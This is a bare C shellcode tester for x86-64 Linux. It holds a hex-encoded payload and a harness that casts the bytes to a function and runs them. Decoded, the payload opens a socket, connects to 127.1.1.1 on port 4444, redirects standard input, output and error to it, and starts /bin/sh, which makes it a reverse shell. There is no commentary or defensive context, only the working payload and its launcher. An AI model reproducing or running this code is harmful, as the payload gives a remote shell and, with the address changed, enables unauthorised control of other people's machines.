#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb0\x29\x48\xff\xc7\x48\xff\xc7\x48\xff\xc6\x0f\x05\x48\x89\xc7\x48\x31\xd2\x48\x31\xed\x66\x6a\x02\x66\x5d\x52\xc7\x44\x24\xfc\x7f\x01\x01\x01\x66\xc7\x44\x24\xfa\x11\x5c\x66\x89\x6c\x24\xf8\x48\x83\xec\x08\xb0\x2a\x48\x89\xe6\xb2\x10\x0f\x05\xb0\x21\x48\x31\xf6\x0f\x05\xb0\x21\x48\xff\xc6\x0f\x05\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"

;

main()
{
 
printf("Shellcode Length:  %d\n", (int)strlen(code));
 
int (*ret)() = (int(*)())code;
 
ret();
 
}
